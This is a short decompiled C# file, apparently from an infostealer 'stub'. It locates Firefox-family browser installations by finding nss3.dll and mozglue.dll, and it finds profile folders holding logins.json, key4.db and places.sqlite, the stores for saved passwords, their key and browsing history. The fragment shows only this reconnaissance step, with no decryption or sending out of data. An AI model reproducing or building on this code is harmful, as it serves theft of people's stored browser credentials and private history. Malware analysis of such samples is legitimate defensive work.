using System;
using System.Collections.Generic;
using System.IO;

namespace Stub
{
	// Token: 0x0200001E RID: 30
	public class Class26
	{
		// Token: 0x06000052 RID: 82 RVA: 0x00003C68 File Offset: 0x00001E68
		public static string[] smethod_0(string[] String_0, string[] String_1)
		{
			if (String_0 == null)
			{
				throw new ArgumentNullException("x");
			}
			if (String_1 == null)
			{
				throw new ArgumentNullException("y");
			}
			int destinationIndex = String_0.Length;
			Array.Resize<string>(ref String_0, String_0.Length + String_1.Length);
			Array.Copy(String_1, 0, String_0, destinationIndex, String_1.Length);
			return String_0;
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00003CB0 File Offset: 0x00001EB0
		public static string[] smethod_1()
		{
			string[] array = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
			if (8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
			{
				array = Class26.smethod_0(array, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
			}
			return array;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00003D00 File Offset: 0x00001F00
		public static string smethod_2(string String_0)
		{
			try
			{
				string path = Path.Combine(String_0, "Profiles");
				if (Directory.Exists(path))
				{
					foreach (string text in Directory.GetDirectories(path))
					{
						if (File.Exists(text + "\\logins.json") || File.Exists(text + "\\key4.db") || File.Exists(text + "\\places.sqlite"))
						{
							return text;
						}
					}
				}
			}
			catch (Exception ex)
			{
				string str = "Failed to find profile\n";
				Exception ex2 = ex;
				Console.WriteLine(str + ((ex2 != null) ? ex2.ToString() : null));
			}
			return null;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00003DAC File Offset: 0x00001FAC
		public static string smethod_3()
		{
			foreach (string text in Class26.smethod_1())
			{
				if (File.Exists(text + "\\nss3.dll") && File.Exists(text + "\\mozglue.dll"))
				{
					return text;
				}
			}
			return null;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00003DF8 File Offset: 0x00001FF8
		public static string[] smethod_4()
		{
			List<string> list = new List<string>();
			foreach (string path in Class25.String_1)
			{
				string text = Path.Combine(Class25.String_3, path);
				if (Directory.Exists(text))
				{
					list.Add(text);
				}
			}
			return list.ToArray();
		}
	}
}
